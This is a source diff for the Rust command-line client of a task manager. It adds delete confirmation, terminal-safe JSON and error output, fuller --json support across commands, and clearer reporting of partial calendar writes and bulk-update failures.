@@ -356,8 +356,9 @@ enum RemoteCommand {
     Snooze(RemoteSnoozeArgs),
     /// `pt remote depend <query> --on <target> [--clear]`.
     Depend(RemoteDependArgs),
-    /// `pt remote rm <query>` — permanent delete (tombstoned).
-    Rm(RemoteDoneArgs),
+    /// `pt remote rm <query>` — permanent delete (tombstoned). Asks first;
+    /// refuses without --yes when there is no TTY to ask on.
+    Rm(RemoteRmArgs),
     /// `pt remote version` — compare this client's version against the
     /// canonical server's `GET /version`. Exits non-zero on skew.
     Version(RemoteVersionArgs),
@@ -418,6 +419,17 @@ struct RemoteListArgs {
 struct RemoteDoneArgs {
     /// PT-N (e.g. PT-42), bare integer (42), or title substring.
     query: String,
+    #[arg(long = "url", env = "PTASK_SYNC_URL")]
+    url: Option<String>,
+}
+
+#[derive(clap::Args, Debug)]
+struct RemoteRmArgs {
+    /// PT-N, bare integer, uuid, or a title substring (open tasks only).
+    query: String,
+    /// Skip the confirmation prompt.
+    #[arg(short = 'y', long = "yes")]
+    yes: bool,
     #[arg(long = "url", env = "PTASK_SYNC_URL")]
     url: Option<String>,
 }
@@ -532,6 +544,9 @@ enum ViewCommand {
         /// Override row limit.
         #[arg(short = 'n', long = "limit", default_value_t = 20)]
         limit: usize,
+        /// Filter by status (or `all`), as in `pt list`.
+        #[arg(short = 's', long = "status", default_value = "pending")]
+        status: String,
     },
     /// Delete a saved view.
     Rm { name: String },
@@ -755,9 +770,22 @@ fn json_mode() -> bool {
 
 /// Print a value as pretty JSON when --json is set; otherwise run the
 /// human-text closure.
+/// Pretty JSON that is safe on a terminal: serde_json escapes C0 controls
+/// only, so DEL, C1 and bidi/invisible characters are re-escaped as \uXXXX
+/// (still valid JSON with the same value). Every JSON printer uses this.
+pub(crate) fn json_pretty<T: serde::Serialize + ?Sized>(value: &T) -> Result<String> {
+    let raw = serde_json::to_string_pretty(value)?;
+    Ok(ptask_core::text::json_terminal_safe(&raw).into_owned())
+}
+
+pub(crate) fn print_json<T: serde::Serialize + ?Sized>(value: &T) -> Result<()> {
+    println!("{}", json_pretty(value)?);
+    Ok(())
+}
+
 fn emit<T: serde::Serialize>(value: &T, text: impl FnOnce()) -> Result<()> {
     if json_mode() {
-        println!("{}", serde_json::to_string_pretty(value)?);
+        print_json(value)?;
     } else {
         text();
     }
@@ -906,7 +934,7 @@ fn replay_keyed(db: &Db, key: &str, cmd: &Command) -> Result<bool> {
     if event.event_type.starts_with("goal.") {
         let goal = ptask_core::goals::get(db, subject).map_err(anyhow::Error::msg)?;
         if json_mode() {
-            println!("{}", serde_json::to_string_pretty(&goal.to_json())?);
+            crate::print_json(&goal.to_json())?;
         } else {
             println!(
                 "{}",
@@ -947,6 +975,25 @@ fn replay_keyed(db: &Db, key: &str, cmd: &Command) -> Result<bool> {
     Ok(true)
 }
 
+/// `--json` shape for a remote verb that acted on one task: its identity,
+/// the verb, and whatever the client knows of the result.
+fn remote_outcome(
+    task: &ptask_core::Task,
+    action: &str,
+    extra: serde_json::Value,
+) -> serde_json::Value {
+    let mut out = serde_json::json!({
+        "pt_id": task.pt_id,
+        "task_uuid": task.id,
+        "title": task.title,
+        "action": action,
+    });
+    if let (Some(out), serde_json::Value::Object(extra)) = (out.as_object_mut(), extra) {
+        out.extend(extra);
+    }
+    out
+}
+
 /// `pt remote list` filter with `-p` folded in as a DSL `pN` term.
 fn remote_list_filter(filter: Option<&str>, priority: Option<i64>) -> Option<String> {
     match (filter, priority) {
@@ -973,7 +1020,18 @@ fn main() {
         libc::signal(libc::SIGPIPE, libc::SIG_DFL);
     }
     if let Err(e) = run() {
-        eprintln!("{}", ui::section("error", ui::Ink::Red, &format!("{e:#}")));
+        // Core errors use newlines as structure (the ambiguous-match list)
+        // and fold them inside the titles they embed, so each line prints
+        // on its own, painted (and therefore sanitised) one at a time.
+        let msg = format!("{e:#}");
+        let mut lines = msg.lines();
+        eprintln!(
+            "{}",
+            ui::section("error", ui::Ink::Red, lines.next().unwrap_or(""))
+        );
+        for line in lines {
+            eprintln!("  {}", ui::paint(line, ui::Ink::Slate));
+        }
         std::process::exit(approvals::exit_code(&e).unwrap_or(1));
     }
 }
@@ -981,6 +1039,13 @@ fn main() {
 fn run() -> Result<()> {
     let cli = Cli::parse();
     set_cli_globals(cli.json, cli.idempotency_key.clone());
+    if let Some(key) = cli.idempotency_key.as_deref()
+        && ptask_core::event_log::is_reserved_client_key(key)
+    {
+        // The capture lane's keys mark capture-created tasks (what
+        // /capture/resolve may close); a client key must not forge one.
+        anyhow::bail!("--idempotency-key: the capture prefix is reserved for the capture lane");
+    }
     if cli.idempotency_key.is_some() {
         // A key on a verb that cannot replay would mint twice or hit the
         // journal's unique index on retry: refuse it up front.
@@ -1009,7 +1074,22 @@ fn run() -> Result<()> {
     let filter = tracing_subscriber::EnvFilter::try_from_env("PTASK_LOG")
         .unwrap_or_else(|_| tracing_subscriber::EnvFilter::new("warn"));
     // Colour only for a terminal: scripts and agents read stderr as text.
+    // Field values can carry DB or task text (a SQLite error quoting a
+    // title, say), so each is folded to one sanitised line before it
+    // reaches the terminal.
+    use tracing_subscriber::field::MakeExt;
+    let fields = tracing_subscriber::fmt::format::debug_fn(|w, field, value| {
+        let text = format!("{value:?}");
+        let text = ui::one_line(&text);
+        if field.name() == "message" {
+            write!(w, "{text}")
+        } else {
+            write!(w, "{}={text}", field.name())
+        }
+    })
+    .delimited(" ");
     tracing_subscriber::fmt()
+        .fmt_fields(fields)
         .with_env_filter(filter)
         .with_writer(std::io::stderr)
         .with_ansi(std::io::stderr().is_terminal())
@@ -1083,6 +1163,7 @@ fn run() -> Result<()> {
                     ptask_core::approvals::Decision::Approve,
                     a.note.as_deref(),
                     a.via,
+                    a.force,
                     cli_ctx(),
                     json_mode(),
                 ),
@@ -1092,6 +1173,7 @@ fn run() -> Result<()> {
                     ptask_core::approvals::Decision::Reject,
                     a.note.as_deref(),
                     a.via,
+                    a.force,
                     cli_ctx(),
                     json_mode(),
                 ),
@@ -1194,29 +1276,30 @@ fn cmd_add(db: &Db, a: AddArgs) -> Result<()> {
         );
         // Echo the parsed interpretation so a silent quick-add mis-parse
         // (the PT-653 class) is visible at the moment of creation.
-        let mut pairs: Vec<(&str, String)> = vec![("priority", ui::priority_pill(t.priority))];
+        let mut pairs: Vec<(&str, ui::Cell)> =
+            vec![("priority", ui::painted(ui::priority_pill(t.priority)))];
         if let Some(d) = &t.deadline {
-            pairs.push(("deadline", ui::due_cell(Some(d))));
+            pairs.push(("deadline", ui::painted(ui::due_cell(Some(d)))));
         }
         if !t.description.is_empty() {
-            pairs.push(("desc", t.description.clone()));
+            pairs.push(("desc", (&t.description).into()));
         }
         if !out.labels.is_empty() {
-            pairs.push(("labels", out.labels.join(", ")));
+            pairs.push(("labels", out.labels.join(", ").into()));
         }
         if let Some(p) = &out.project {
-            pairs.push(("project", p.clone()));
+            pairs.push(("project", p.into()));
         }
         if let Some(m) = out.duration_min {
-            pairs.push(("estimate", format!("{m}m")));
+            pairs.push(("estimate", format!("{m}m").into()));
         }
         if let Some(r) = &out.reminder {
-            pairs.push(("reminder", r.clone()));
+            pairs.push(("reminder", r.into()));
         }
         if let Some(rec) = &out.recurrence {
-            pairs.push(("recurs", rec.clone()));
+            pairs.push(("recurs", rec.into()));
         }
-        pairs.push(("uuid", ui::dim(&t.id, ui::Ink::Slate)));
+        pairs.push(("uuid", ui::painted(ui::dim(&t.id, ui::Ink::Slate))));
         for l in ui::kv(&pairs, 14) {
             println!("    {}", l.trim_start());
         }
@@ -1247,7 +1330,7 @@ fn cmd_list(db: &Db, a: ListArgs) -> Result<()> {
     let rows =
         tasks::list_with_filter_sorted(db, filter_expr.as_ref(), status_filter, p, a.limit, sort)?;
     if json_mode() {
-        println!("{}", serde_json::to_string_pretty(&rows)?);
+        crate::print_json(&rows)?;
         return Ok(());
     }
     let mut note = format!("{} · sorted by {}", a.status, a.sort);
@@ -1353,7 +1436,7 @@ fn cmd_done(db: &Db, a: DoneArgs) -> Result<()> {
         }
     }
     if json_mode() {
-        println!("{}", serde_json::to_string_pretty(&results)?);
+        crate::print_json(&results)?;
     }
     if failed > 0 {
         anyhow::bail!("{failed} of {} task(s) not completed", a.queries.len());
@@ -1579,7 +1662,7 @@ fn cmd_show(db: &Db, a: ShowArgs) -> Result<()> {
         let mut v = serde_json::to_value(&t)?;
         v["goal_chain"] = ptask_core::goals::chain_json(&eg.chain);
         v["goal_source"] = serde_json::json!(eg.source.as_str());
-        println!("{}", serde_json::to_string_pretty(&v)?);
+        crate::print_json(&v)?;
         return Ok(());
     }
     print_lines(render_show(&t, Some(&d), &blocked, &eg.chain));
@@ -1606,10 +1689,13 @@ fn cmd_context(db: &Db, a: ContextArgs) -> Result<()> {
             })).collect::<Vec<_>>(),
             "markdown": ptask_core::goals::context_markdown(db, &t)?,
         });
-        println!("{}", serde_json::to_string_pretty(&v)?);
+        crate::print_json(&v)?;
         return Ok(());
     }
-    print!("{}", ptask_core::goals::context_markdown(db, &t)?);
+    print!(
+        "{}",
+        ui::sanitize(&ptask_core::goals::context_markdown(db, &t)?)
+    );
     Ok(())
 }
 
@@ -1632,47 +1718,48 @@ fn render_show(
         out.push(format!("  {}", ui::bold(&l, ui::Ink::Paper)));
     }
     out.push(String::new());
-    let mut pairs: Vec<(&str, String)> = vec![
-        ("status", ui::status_pill(&t.status)),
+    let mut pairs: Vec<(&str, ui::Cell)> = vec![
+        ("status", ui::painted(ui::status_pill(&t.status))),
         (
             "priority",
-            format!(
+            ui::painted(format!(
                 "{}{}",
                 ui::priority_pill(t.priority),
                 ui::dim(&format!("  ({})", t.priority), ui::Ink::Slate)
-            ),
+            )),
         ),
-        ("deadline", ui::due_cell(t.deadline.as_deref())),
+        ("deadline", ui::painted(ui::due_cell(t.deadline.as_deref()))),
         (
             "kind",
             match t.deliverable.as_deref() {
                 Some(dl) => format!("{} → {dl}", t.kind),
                 None => t.kind.clone(),
-            },
+            }
+            .into(),
         ),
     ];
     if let Some(d) = d {
         if !d.labels.is_empty() {
-            pairs.push(("labels", d.labels.join(", ")));
+            pairs.push(("labels", d.labels.join(", ").into()));
         }
         if let Some(p) = &d.project {
-            pairs.push(("project", p.clone()));
+            pairs.push(("project", p.into()));
         }
         if let Some(m) = d.duration_min {
-            pairs.push(("estimate", format!("{m}m")));
+            pairs.push(("estimate", format!("{m}m").into()));
         }
         if !d.depends_on.is_empty() {
-            pairs.push(("depends on", d.depends_on.join(", ")));
+            pairs.push(("depends on", d.depends_on.join(", ").into()));
         }
         if !d.blocks_tasks.is_empty() {
-            pairs.push(("blocks", d.blocks_tasks.join(", ")));
+            pairs.push(("blocks", d.blocks_tasks.join(", ").into()));
         }
         if let Some(r) = &d.recurrence_input {
-            pairs.push(("recurs", r.clone()));
+            pairs.push(("recurs", r.into()));
         }
     }
-    pairs.push(("source", t.source_type.clone()));
-    pairs.push(("uuid", ui::dim(&t.id, ui::Ink::Slate)));
+    pairs.push(("source", (&t.source_type).into()));
+    pairs.push(("uuid", ui::painted(ui::dim(&t.id, ui::Ink::Slate))));
     out.extend(ui::kv(&pairs, 14));
     if !blocked.is_empty() {
         out.push(String::new());
@@ -1686,9 +1773,10 @@ fn render_show(
         out.push(String::new());
         out.push(ui::section("why", ui::Ink::Magenta, ""));
         for g in why_chain {
+            let title = ui::one_line(&g.title);
             match g.why.as_deref().map(str::trim).filter(|s| !s.is_empty()) {
-                Some(why) => out.push(format!("  {}: {why}", g.title)),
-                None => out.push(format!("  {}", g.title)),
+                Some(why) => out.push(format!("  {title}: {}", ui::one_line(why))),
+                None => out.push(format!("  {title}")),
             }
         }
     }
@@ -1728,32 +1816,38 @@ fn cmd_dismiss(db: &Db, a: DismissArgs) -> Result<()> {
     )
 }
 
+/// Confirm a permanent delete of `pt` on the operator's TTY. No
+/// confirmation possible (piped, agent, --json): refuse loudly — printing
+/// "aborted" and exiting 0 read as success to a caller.
+fn confirm_delete(pt: &str, title: &str) -> Result<()> {
+    if json_mode() || !std::io::stdin().is_terminal() {
+        anyhow::bail!("refusing to delete {pt} without --yes (no TTY to confirm)");
+    }
+    use std::io::Write;
+    print!(
+        "{}",
+        ui::prompt(
+            format!(
+                "permanently delete {pt} \"{}\"? This cannot be undone.",
+                ui::one_line(title)
+            ),
+            "[y/N]"
+        )
+    );
+    std::io::stdout().flush().ok();
+    let mut line = String::new();
+    std::io::stdin().read_line(&mut line).ok();
+    if !matches!(line.trim().to_ascii_lowercase().as_str(), "y" | "yes") {
+        anyhow::bail!("aborted: {pt} not deleted");
+    }
+    Ok(())
+}
+
 fn cmd_rm(db: &Db, a: RmArgs) -> Result<()> {
     let task = tasks::resolve(db, &a.query).map_err(anyhow::Error::msg)?;
     let pt = task.pt_id.as_deref().unwrap_or("").to_string();
     if !a.yes {
-        // No confirmation possible (piped, agent, --json): refuse loudly.
-        // Printing "aborted" and exiting 0 read as success to a caller.
-        if json_mode() || !std::io::stdin().is_terminal() {
-            anyhow::bail!("refusing to delete {pt} without --yes (no TTY to confirm)");
-        }
-        use std::io::Write;
-        print!(
-            "{}",
-            ui::prompt(
-                &format!(
-                    "permanently delete {pt} \"{}\"? This cannot be undone.",
-                    task.title
-                ),
-                "[y/N]"
-            )
-        );
-        std::io::stdout().flush().ok();
-        let mut line = String::new();
-        std::io::stdin().read_line(&mut line).ok();
-        if !matches!(line.trim().to_ascii_lowercase().as_str(), "y" | "yes") {
-            anyhow::bail!("aborted: {pt} not deleted");
-        }
+        confirm_delete(&pt, &task.title)?;
     }
     tasks::delete_task(db, &task.id, &cli_ctx())?;
     emit(
@@ -1770,7 +1864,7 @@ fn cmd_rm(db: &Db, a: RmArgs) -> Result<()> {
 fn cmd_next(db: &Db, a: NextArgs) -> Result<()> {
     let rows = dag::next_ready(db, a.limit)?;
     if json_mode() {
-        println!("{}", serde_json::to_string_pretty(&rows)?);
+        crate::print_json(&rows)?;
         return Ok(());
     }
     print_lines(ui::headline(
@@ -1906,11 +2000,15 @@ fn cmd_plan(db: &Db, a: PlanArgs) -> Result<()> {
         .collect();
 
     // 4. optional --write: tentative events on OUR calendar only
+    let mut not_written: Vec<String> = Vec::new();
+    // Holds created so far: if a later spawn fails, they are already real
+    // calendar events and the error must say so.
+    let mut created: Vec<String> = Vec::new();
     if a.write {
         for s in &scheduled {
             let pt = s.pt_id.as_deref().unwrap_or("--");
             let title = format!("[pt] {} {}", pt, s.title);
-            let status = Proc::new("python3")
+            let spawned = Proc::new("python3")
                 .arg(&gcal)
                 .arg(&a.account)
                 .arg("create")
@@ -1919,10 +2017,25 @@ fn cmd_plan(db: &Db, a: PlanArgs) -> Result<()> {
                 .args(["--end", &s.end])
                 .args(["--calendar", &a.calendar])
                 .args(["--description", &format!("advisory-plan {}", pt)])
-                .status()
-                .with_context(|| "creating calendar event")?;
-            if !status.success() {
+                .status();
+            let status = match spawned {
+                Ok(status) => status,
+                Err(e) => {
+                    let done = if created.is_empty() {
+                        "none".to_string()
+                    } else {
+                        created.join(", ")
+                    };
+                    return Err(anyhow::Error::new(e).context(format!(
+                        "creating the calendar event for {pt}; holds already created: {done}"
+                    )));
+                }
+            };
+            if status.success() {
+                created.push(pt.to_string());
+            } else {
                 eprintln!("warning: failed to create event for {}", pt);
+                not_written.push(pt.to_string());
             }
         }
     }
@@ -1933,13 +2046,18 @@ fn cmd_plan(db: &Db, a: PlanArgs) -> Result<()> {
         unscheduled,
     };
     let write = a.write;
+    let holds = output.scheduled.len();
     emit(&output, || {
         print_lines(ui::headline(
             "ptask · plan",
-            Some(if write {
-                ("written", ui::Ink::Green)
-            } else {
+            Some(if !write {
                 ("advisory", ui::Ink::Amber)
+            } else if not_written.is_empty() {
+                ("written", ui::Ink::Green)
+            } else if not_written.len() == holds {
+                ("not written", ui::Ink::Red)
+            } else {
+                ("partly written", ui::Ink::Amber)
             }),
             &format!("free-slot fit · {}", output.tz),
         ));
@@ -1976,8 +2094,13 @@ fn cmd_plan(db: &Db, a: PlanArgs) -> Result<()> {
                     ]
                 })
                 .collect();
-            print_lines(ui::table(&cols, &rows, &Default::default()));
-            println!("{}", ui::footer(rows.len(), "hold", ""));
+            let n = rows.len();
+            print_lines(ui::table(
+                &cols,
+                &ui::painted_rows(rows),
+                &Default::default(),
+            ));
+            println!("{}", ui::footer(n, "hold", ""));
         }
         if !output.unscheduled.is_empty() {
             println!();
@@ -1994,7 +2117,7 @@ fn cmd_plan(db: &Db, a: PlanArgs) -> Result<()> {
                     "{}",
                     ui::bullet(
                         u.pt_id.as_deref().unwrap_or("------"),
-                        &format!("{:>3}m  {}", u.duration_min, u.title),
+                        format!("{:>3}m  {}", u.duration_min, u.title),
                         ui::Ink::Amber,
                         8
                     )
@@ -2008,38 +2131,55 @@ fn cmd_plan(db: &Db, a: PlanArgs) -> Result<()> {
                 ui::note("advisory only — re-run with --write to add tentative holds")
             );
         }
-    })
+    })?;
+    if !not_written.is_empty() {
+        anyhow::bail!(
+            "plan --write: {} of {holds} calendar hold(s) not created ({})",
+            not_written.len(),
+            not_written.join(", ")
+        );
+    }
+    Ok(())
 }
 
 fn cmd_view(db: &Db, c: ViewCommand) -> Result<()> {
     match c {
         ViewCommand::Save { name, filter } => {
             let v = views::create(db, &name, &filter).map_err(anyhow::Error::msg)?;
-            println!(
-                "{}",
-                ui::outcome(ui::Status::Ok, "saved", &v.name, &v.filter_dsl, "view")
-            );
-            Ok(())
+            emit(&v, || {
+                println!(
+                    "{}",
+                    ui::outcome(ui::Status::Ok, "saved", &v.name, &v.filter_dsl, "view")
+                )
+            })
         }
         ViewCommand::List => {
             let vs = views::list(db).map_err(anyhow::Error::msg)?;
-            print_lines(ui::headline("ptask · views", None, "saved filters"));
-            if vs.is_empty() {
-                println!("{}", ui::empty("no saved views"));
-                return Ok(());
-            }
-            for v in &vs {
-                println!("{}", ui::bullet(&v.name, &v.filter_dsl, ui::Ink::Cyan, 24));
-            }
-            println!("{}", ui::footer(vs.len(), "view", "pt view show NAME"));
-            Ok(())
+            emit(&vs, || {
+                print_lines(ui::headline("ptask · views", None, "saved filters"));
+                if vs.is_empty() {
+                    println!("{}", ui::empty("no saved views"));
+                    return;
+                }
+                for v in &vs {
+                    println!("{}", ui::bullet(&v.name, &v.filter_dsl, ui::Ink::Cyan, 24));
+                }
+                println!("{}", ui::footer(vs.len(), "view", "pt view show NAME"));
+            })
         }
-        ViewCommand::Show { name, limit } => {
+        ViewCommand::Show {
+            name,
+            limit,
+            status,
+        } => {
             let v = views::get(db, &name).map_err(anyhow::Error::msg)?;
             let expr = ptask_core::filter::parse(&v.filter_dsl).map_err(anyhow::Error::msg)?;
-            let rows = tasks::list_with_filter(db, Some(&expr), None, None, limit)?;
+            // Open tasks by default: the DSL has no status predicate, so a
+            // view used to let done/dismissed rows crowd out open ones.
+            let status = (status != "all").then_some(status.as_str());
+            let rows = tasks::list_with_filter(db, Some(&expr), status, None, limit)?;
             if json_mode() {
-                println!("{}", serde_json::to_string_pretty(&rows)?);
+                crate::print_json(&rows)?;
                 return Ok(());
             }
             print_lines(ui::headline(
@@ -2057,15 +2197,19 @@ fn cmd_view(db: &Db, c: ViewCommand) -> Result<()> {
         }
         ViewCommand::Rm { name } => {
             let removed = views::delete(db, &name).map_err(anyhow::Error::msg)?;
-            if removed {
-                println!(
-                    "{}",
-                    ui::outcome(ui::Status::Bad, "removed", &name, "", "view")
-                );
-            } else {
-                println!("{}", ui::empty(&format!("no view named {name:?}")));
-            }
-            Ok(())
+            emit(
+                &serde_json::json!({ "name": name, "removed": removed }),
+                || {
+                    if removed {
+                        println!(
+                            "{}",
+                            ui::outcome(ui::Status::Bad, "removed", &name, "", "view")
+                        );
+                    } else {
+                        println!("{}", ui::empty(&format!("no view named {name:?}")));
+                    }
+                },
+            )
         }
     }
 }
@@ -2091,7 +2235,7 @@ fn cmd_mcp(db: Db) -> Result<()> {
 
 fn cmd_digest(db: &Db, a: DigestArgs) -> Result<()> {
     let v = ptask_core::digest::build(db, a.days)?;
-    println!("{}", serde_json::to_string_pretty(&v)?);
+    crate::print_json(&v)?;
     Ok(())
 }
 
@@ -2126,7 +2270,11 @@ fn cmd_export(db: &Db, a: ExportArgs) -> Result<()> {
                     },
                 );
             }
-            lines.push(serde_json::to_string(&m)?);
+            // Terminal-safe like every JSON printer: `cat` on an export
+            // must not replay escape or bidi characters.
+            lines.push(
+                ptask_core::text::json_terminal_safe(&serde_json::to_string(&m)?).into_owned(),
+            );
         }
         std::fs::write(out.join(file), lines.join("\n") + "\n")?;
         Ok(lines.len())
@@ -2233,7 +2381,11 @@ fn shell_single_quote(value: &str) -> String {
     format!("'{}'", value.replace('\'', "'\"'\"'"))
 }
 
+/// The operator copies this off the screen, so it is built from the
+/// sanitised title: a CR/erase or conceal sequence in the title could
+/// otherwise make the visible command differ from the copied one.
 fn delegation_command(handle: &str, title: &str) -> String {
+    let title = ui::one_line(title);
     let prompt = format!(
         "Work the pTask task {handle}: {title}. When done: pt done {handle}; if blocked, pt add the blocker as its own task, then pt depend {handle} --on <its PT-N>."
     );
@@ -2245,21 +2397,21 @@ fn delegation_command(handle: &str, title: &str) -> String {
 fn cmd_delegate(db: &Db, a: DelegateArgs) -> Result<()> {
     let t = tasks::resolve_for_lookup(db, &a.id, false).map_err(anyhow::Error::msg)?;
     let handle = t.pt_id.clone().unwrap_or_else(|| t.id.clone());
-    print_lines(ui::headline(
-        &format!("ptask · delegate {handle}"),
-        Some(("operator-gated", ui::Ink::Amber)),
-        "review, then run it yourself",
-    ));
-    println!(
-        "  {}",
-        ui::paint(&delegation_command(&handle, &t.title), ui::Ink::Paper)
-    );
-    println!();
-    println!(
-        "{}",
-        ui::note("operator-gated by design — pt will not spawn agents autonomously")
-    );
-    Ok(())
+    let command = delegation_command(&handle, &t.title);
+    let out = serde_json::json!({ "pt_id": t.pt_id, "task_uuid": t.id, "command": command });
+    emit(&out, || {
+        print_lines(ui::headline(
+            &format!("ptask · delegate {handle}"),
+            Some(("operator-gated", ui::Ink::Amber)),
+            "review, then run it yourself",
+        ));
+        println!("  {}", ui::paint(&command, ui::Ink::Paper));
+        println!();
+        println!(
+            "{}",
+            ui::note("operator-gated by design — pt will not spawn agents autonomously")
+        );
+    })
 }
 
 fn cmd_serve(db: Db, a: ServeArgs) -> Result<()> {
@@ -2396,7 +2548,7 @@ fn cmd_accountability(db: Db, c: AccountabilityCommand) -> Result<()> {
                     "{}",
                     ui::bullet(
                         &d.task_uuid,
-                        &format!(
+                        format!(
                             "level {} · telegram {} · email {}{}",
                             d.level,
                             d.telegram_sent,
@@ -2570,8 +2722,8 @@ fn cmd_depend(db: &Db, a: DependArgs) -> Result<()> {
             };
             print_lines(ui::kv(
                 &[
-                    ("depends on", fmt(&detail.depends_on)),
-                    ("blocks", fmt(&detail.blocks_tasks)),
+                    ("depends on", fmt(&detail.depends_on).into()),
+                    ("blocks", fmt(&detail.blocks_tasks).into()),
                 ],
                 14,
             ))
@@ -2636,23 +2788,23 @@ fn cmd_why(db: &Db, a: WhyArgs) -> Result<()> {
         };
         print_lines(ui::kv(
             &[
-                ("urgency", term(b.urgency, wu, "")),
+                ("urgency", ui::painted(term(b.urgency, wu, ""))),
                 (
                     "dependency",
-                    term(b.dependency, wd, "active tasks blocked by this"),
+                    ui::painted(term(b.dependency, wd, "active tasks blocked by this")),
                 ),
                 (
                     "neglect",
-                    term(b.neglect, wn, "time since last touch / 30d"),
+                    ui::painted(term(b.neglect, wn, "time since last touch / 30d")),
                 ),
-                ("manual", term(b.manual, wm, "priority")),
+                ("manual", ui::painted(term(b.manual, wm, "priority"))),
                 (
                     "effort",
-                    format!(
+                    ui::painted(format!(
                         "{}  {}",
                         ui::paint(&format!("×{:.3}", b.effort_factor), ui::Ink::Paper),
                         ui::dim(&format!("llm nudge {:+.3}", b.score_llm), ui::Ink::Slate)
-                    ),
+                    )),
                 ),
             ],
             14,
@@ -2721,44 +2873,65 @@ fn cmd_search(db: &Db, a: SearchArgs) -> Result<()> {
 
 fn cmd_bulk(db: &Db, a: BulkArgs) -> Result<()> {
     let expr = ptask_core::filter::parse(&a.filter).map_err(anyhow::Error::msg)?;
-    let matches = tasks::list_with_filter(db, Some(&expr), Some("pending"), None, 10_000)
-        .map_err(anyhow::Error::msg)?;
-    if matches.is_empty() {
-        println!(
-            "{}",
-            ui::empty(&format!("bulk: no tasks match {:?}", a.filter))
-        );
-        return Ok(());
-    }
-    let action = if let Some(prio) = a.set_priority.as_deref() {
-        format!("set priority {}", prio)
-    } else if a.done {
-        "mark done".into()
-    } else if a.dismiss {
-        "dismiss".into()
-    } else {
-        anyhow::bail!("bulk needs one of --set-priority / --done / --dismiss");
-    };
-    print_lines(ui::headline(
-        "ptask · bulk",
-        Some(if a.dry_run {
-            ("dry run", ui::Ink::Amber)
-        } else {
-            ("apply", ui::Ink::Magenta)
-        }),
-        &format!("{} match {:?} · action: {action}", matches.len(), a.filter),
-    ));
-    print_lines(ui::task_table(&matches, false, false, false));
-    if a.dry_run {
-        println!("{}", ui::note("dry run — nothing applied"));
-        return Ok(());
-    }
+    // Validate before the dry run returns: `--set-priority bogus --dry-run`
+    // previewed happily and exited 0.
     let level = a
         .set_priority
         .as_deref()
         .map(priority::parse)
         .transpose()
         .map_err(anyhow::Error::msg)?;
+    let matches = tasks::list_with_filter(db, Some(&expr), Some("pending"), None, 10_000)
+        .map_err(anyhow::Error::msg)?;
+    let action = if let Some(prio) = a.set_priority.as_deref() {
+        Some(format!("set priority {}", prio))
+    } else if a.done {
+        Some("mark done".to_string())
+    } else if a.dismiss {
+        Some("dismiss".to_string())
+    } else {
+        None
+    };
+    let report = |failures: &[(String, String)]| {
+        serde_json::json!({
+            "filter": a.filter,
+            "action": action,
+            "dry_run": a.dry_run,
+            "matched": matches,
+            "failures": failures
+                .iter()
+                .map(|(pt, e)| serde_json::json!({ "task": pt, "error": e }))
+                .collect::<Vec<_>>(),
+        })
+    };
+    if matches.is_empty() {
+        return emit(&report(&[]), || {
+            println!(
+                "{}",
+                ui::empty(&format!("bulk: no tasks match {:?}", a.filter))
+            )
+        });
+    }
+    let Some(action) = action.as_deref() else {
+        anyhow::bail!("bulk needs one of --set-priority / --done / --dismiss");
+    };
+    if !json_mode() {
+        print_lines(ui::headline(
+            "ptask · bulk",
+            Some(if a.dry_run {
+                ("dry run", ui::Ink::Amber)
+            } else {
+                ("apply", ui::Ink::Magenta)
+            }),
+            &format!("{} match {:?} · action: {action}", matches.len(), a.filter),
+        ));
+        print_lines(ui::task_table(&matches, false, false, false));
+    }
+    if a.dry_run {
+        return emit(&report(&[]), || {
+            println!("{}", ui::note("dry run — nothing applied"))
+        });
+    }
     // Apply to every match; a failing task (e.g. blocked by another match)
     // is reported and the rest still land, instead of stopping half-done.
     let mut pending: Vec<&ptask_core::Task> = matches.iter().collect();
@@ -2776,7 +2949,9 @@ fn cmd_bulk(db: &Db, a: BulkArgs) -> Result<()> {
                 tasks::update_priority(db, &t.id, level, &ctx).map(|_| ())
             } else if a.done {
                 tasks::mark_done(db, t, &ctx).map(|outcome| {
-                    if let tasks::DoneOutcome::Advanced { next_deadline } = outcome {
+                    if let tasks::DoneOutcome::Advanced { next_deadline } = outcome
+                        && !json_mode()
+                    {
                         println!(
                             "{}",
                             ui::outcome(
@@ -2805,7 +2980,8 @@ fn cmd_bulk(db: &Db, a: BulkArgs) -> Result<()> {
         }
         pending = retry;
     }
-    match ptask_core::scoring::run_once(db, false) {
+    let rescored = ptask_core::scoring::run_once(db, false);
+    emit(&report(&failures), || match rescored {
         Ok(r) => println!(
             "{}",
             ui::section(
@@ -2822,7 +2998,7 @@ fn cmd_bulk(db: &Db, a: BulkArgs) -> Result<()> {
                 &format!("{} task(s) · rescore failed: {e}", matches.len())
             )
         ),
-    }
+    })?;
     for (pt, e) in &failures {
         eprintln!(
             "{}",
@@ -2862,12 +3038,30 @@ fn stale_review_tasks(db: &Db, cutoff_iso: &str) -> Result<Vec<ReviewRow>> {
 
 fn cmd_review(db: &Db, a: ReviewArgs) -> Result<()> {
     use std::io::Write;
+    // Checked: jiff's infallible Span::days panicked (exit 101) past ±7.3M days.
+    let span = ptask_core::jiff::Span::new()
+        .try_days(a.stale_days)
+        .map_err(|_| anyhow::anyhow!("--stale-days {} is out of range", a.stale_days))?;
     let stale_cutoff = ptask_core::dates::now_in_operator_tz()
         .map_err(anyhow::Error::msg)?
-        .checked_sub(ptask_core::jiff::Span::new().days(a.stale_days))
-        .map_err(|e| anyhow::anyhow!("cutoff math: {e}"))?;
+        .checked_sub(span)
+        .map_err(|e| anyhow::anyhow!("--stale-days {}: {e}", a.stale_days))?;
     let cutoff_iso = ptask_core::dates::format_iso(&stale_cutoff);
     let stale = stale_review_tasks(db, &cutoff_iso)?;
+    if json_mode() {
+        // Machine callers get the sweep's list; triage stays interactive.
+        let rows: Vec<serde_json::Value> = stale
+            .iter()
+            .map(|(uuid, pt, title, status, updated)| {
+                serde_json::json!({
+                    "task_uuid": uuid, "pt_id": pt, "title": title,
+                    "status": status, "updated_at": updated,
+                })
+            })
+            .collect();
+        crate::print_json(&rows)?;
+        return Ok(());
+    }
 
     print_lines(ui::headline(
         "ptask · review",
@@ -2894,7 +3088,7 @@ fn cmd_review(db: &Db, a: ReviewArgs) -> Result<()> {
                 "{}",
                 ui::bullet(
                     pt.as_deref().unwrap_or("-"),
-                    &format!(
+                    ui::painted(format!(
                         "{}  {}  {}",
                         ui::status_pill(status),
                         ui::paint(title, ui::Ink::Paper),
@@ -2902,7 +3096,7 @@ fn cmd_review(db: &Db, a: ReviewArgs) -> Result<()> {
                             &format!("last touch {}", updated.get(..10).unwrap_or(updated)),
                             ui::Ink::Slate
                         )
-                    ),
+                    )),
